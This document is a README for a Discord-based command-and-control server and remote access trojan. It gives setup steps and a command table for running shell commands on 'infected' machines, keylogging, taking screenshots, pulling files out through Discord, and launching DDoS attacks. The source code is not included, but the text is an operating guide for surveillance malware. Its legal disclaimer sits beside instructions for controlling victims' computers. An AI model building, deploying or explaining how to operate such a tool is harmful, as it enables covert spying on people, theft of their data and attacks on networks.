# Projectname

> **⚠️ IMPORTANT DISCLAIMER**  
> This tool is provided for educational and authorized testing purposes only. I am not responsible for any misuse, damage, or illegal activities conducted with this software. You must only operate it in a controlled environment with explicit consent from all parties involved. Using this software on individuals or systems without their permission is illegal and unethical. Ensure you comply with all applicable laws and regulations.

---

## Table of Contents
- [Project Overview](#project-overview)
- [Architecture](#architecture)
- [Features](#features)
- [Setup and Configuration](#setup-and-configuration)
  - [Prerequisites](#prerequisites)
  - [Generating SSL Certificates](#generating-ssl-certificates)
  - [Discord Bot Setup](#discord-bot-setup)
  - [C2 Server Setup (`c2.py`)](#c2-server-setup-c2py)
  - [RAT Client Setup (`rat.py`)](#rat-client-setup-ratpy)
- [Usage](#usage)
  - [Discord Commands](#discord-commands)
  - [Client Connection Workflow](#client-connection-workflow)
- [Security Considerations](#security-considerations)
- [Troubleshooting](#troubleshooting)

---

## Project Overview
This project consists of two main components:
1. **C2 Server (`c2.py`)**: A Discord-based command-and-control server that manages infected clients via a Discord server.
2. **RAT Client (`rat.py`)**: A remote access tool that connects to the C2 server and executes commands on the target machine.

The C2 server leverages Discord as the communication interface, allowing operators to control clients through text channels in a Discord server. Each infected machine creates a dedicated channel for interaction.

---

## Architecture
```
┌───────────────┐    SSL/TLS   ┌─────────────┐    Discord API   ┌───────────────┐
│   RAT Client  │◄────────────►│  C2 Server  │◄────────────────►│ Discord Server│
│   (rat.py)    │              │   (c2.py)   │                  │  (Channels)   │
└───────────────┘              └─────────────┘                  └───────────────┘
```
- **RAT Client**: Connects to the C2 server via a secure TLS socket. Executes commands and sends results back.
- **C2 Server**: Listens for client connections, relays commands through Discord, and manages client state.
- **Discord Interface**: Operators use Discord commands to control clients and receive outputs.

---

## Features
### C2 Server (`c2.py`)
- TLS-encrypted socket server for client connections.
- Discord integration for command execution and output display.
- Dynamic channel creation per client.
- Command broadcasting to all clients.
- File upload/download support via Discord attachments.
- Screenshot retrieval, keylogging, volume control, and more.

### RAT Client (`rat.py`)
- Cross-platform support (Windows, Linux, macOS).
- Keylogger with file-based storage.
- Screenshot capture using `mss`.
- File/folder download (with zip compression for folders).
- Volume control.
- Message box popups.
- DDOS functionality.
- Persistent connection with auto-reconnect.

---

## Setup and Configuration

### Prerequisites
- Python 3.8+
- A Discord bot token (create a bot at [Discord Developer Portal](https://discord.com/developers/applications)).
- OpenSSL (for generating certificates).

### Generating SSL Certificates
Generate a self-signed certificate and private key for TLS encryption:
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```
> **Note**: Replace the default `cert.pem` and `key.pem` files with your own for security.

### Discord Bot Setup
1. Create a Discord application and bot at the [Discord Developer Portal](https://discord.com/developers/applications).
2. Copy the bot token and add it to your `.env` file:
   ```env
   TOKEN="your_discord_bot_token_here"
   ```
3. Invite the bot to your Discord server.

### C2 Server Setup (`c2.py`)
1. Place `cert.pem`, `key.pem`, and `.env` in the same directory as `c2.py`.
2. Ensure the `.env` file contains your Discord bot token.
3. Run the server:
   ```bash
   python c2.py
   ```
   The server will start listening on `0.0.0.0:443` (configurable via `HOST` and `PORT`).

### RAT Client Setup (`rat.py`)
1. Edit the `HOST` variable in `rat.py` to point to your C2 server's IP address:
   ```python
   HOST = "your_c2_server_ip"  # Replace with the C2 server IP
   ```
2. Run the client:
   ```bash
   python rat.py
   ```
   The client will connect to the C2 server and create a Discord channel named after the infected machine.

---

## Usage

### Discord Commands
Execute commands in Discord channels associated with clients. Prefix: `!`

| Command | Description | Example |
|---------|-------------|---------|
| `!ping` | Check if the client is responsive. | `!ping` |
| `!shell <command>` | Execute a shell command on the client. | `!shell whoami` |
| `!getscreenpic` | Capture and send a screenshot. | `!getscreenpic` |
| `!volume <0-100>` | Change system volume. | `!volume 50` |
| `!message <title>::<msg>::<icon>` | Show a popup message. Icons: `info`, `warning`, `error`, `question`. | `!message Alert::System compromised::error` |
| `!keylogger` | Retrieve logged keystrokes. | `!keylogger` |
| `!download <path>` | Download a file/folder (folders are zipped). | `!download C:/Users/user/Documents` |
| `!upload <path>` | Upload a file (attach file to the message). | `!upload C:/temp [attach file]` |
| `!ddos <ip>::<port>::<time>` | Perform a DDOS test (use only legally). | `!ddos 192.168.1.1::80::60` |
| `!broadcast <cmd>` | Send a command to all clients. | `!broadcast getscreenpic` |
| `!purge` | Delete messages in the current channel. | `!purge` |
| `!getaliveconnexions` | List active client channels. | `!getaliveconnexions` |
| `!restart` | Restart the C2 bot. | `!restart` |

### Client Connection Workflow
1. The RAT client connects to the C2 server via TLS.
2. The server assigns a channel name based on the client's hostname and machine ID.
3. A Discord channel is created (or reused) for the client.
4. Operators interact with the client via Discord commands.
5. Results are posted back to the channel as text or files.

---

## Security Considerations
- **TLS Encryption**: All socket communications are encrypted using TLS. Use your own certificates to avoid MITM attacks.
- **Discord Token**: Keep your Discord bot token secure. Do not expose it publicly.
- **Keylogger Data**: Stored in the temp file (`Y291Y291IGplIG0nYXBwZWxsZSBmcmFuw6dvaXM=.txt`).
- **Firewall**: Ensure the C2 server's port (443) is open and accessible.
- **Legal Compliance**: Only use this tool in authorized environments. Misuse may violate laws.